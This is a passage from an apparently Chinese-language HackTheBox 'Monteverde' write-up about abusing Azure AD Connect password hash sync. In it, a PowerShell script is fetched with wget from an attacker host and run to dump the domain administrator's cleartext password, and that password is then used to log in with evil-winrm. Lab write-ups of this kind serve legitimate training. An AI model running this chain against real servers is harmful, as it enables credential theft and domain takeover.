+<p>第一个，可以说是最有趣的是密码哈希同步 (PHS)，它将用户帐户和密码哈希从 Active Directory 上传到 Azure。第二种方法是直通身份验证 (PTA)，它允许 Azure 将身份验证请求转发到本地 AD，而不是依赖于上传哈希。最后，我们有了联合身份验证，这是我们多次看到的传统 ADFS 部署。PHS……闻起来像 DCSync要开始我们对 PHS 的分析，我们应该查看负责处理密码哈希同步的程序集之一，<code>Microsoft.Online.PasswordSynchronization.dll</code>. 此程序集可以在 Azure AD Sync 的默认安装路径中找到<code>C:\Program Files\Microsoft Azure AD Sync\Bin</code>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">ls</span> *Microsoft.Online.PasswordSynchronization.dll*<br><br><br>    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">8</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">4</span>:<span class="hljs-number">54</span> PM         <span class="hljs-number">136248</span> Microsoft.Online.PasswordSynchronization.dll<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <br></code></pre></td></tr></table></figure>
+
+<p><code>C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll</code>负责密钥管理和解密此数据的程序集的引用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">ls</span> *mcrypt.dll*<br><br><br>    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        8/31/2018   4:54 PM         335744 mcrypt.dll<br><br><br>*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <br></code></pre></td></tr></table></figure>
+
+<p>我直接引用了大佬的POC脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Program Files\Microsoft Azure AD Sync\Bin&gt; <span class="hljs-built_in">cd</span> /programdata<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.11</span>/<span class="hljs-built_in">Get-AzureADPasswd</span>.ps1 <span class="hljs-literal">-O</span> <span class="hljs-built_in">Get-AzureADPasswd</span>.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; . .\<span class="hljs-built_in">Get-AzureADPasswd</span>.ps1<br>Domain: MEGABANK.LOCAL<br>Username: administrator<br>Password: d0m@in4dminyeah!<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.172</span> <span class="hljs-literal">-u</span> administrator <span class="hljs-literal">-p</span> d0m@in4dminyeah!  <br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">type</span> ../desktop/root.txt<br><span class="hljs-number">129</span>............................................<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Monteverde</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Monteverde/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Markup/" title="HackTheBox-Markup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Markup</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-RouterSpace/" title="HackTheBox-RouterSpace">
+                        <span class="hidden-mobile">HackTheBox-RouterSpace</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
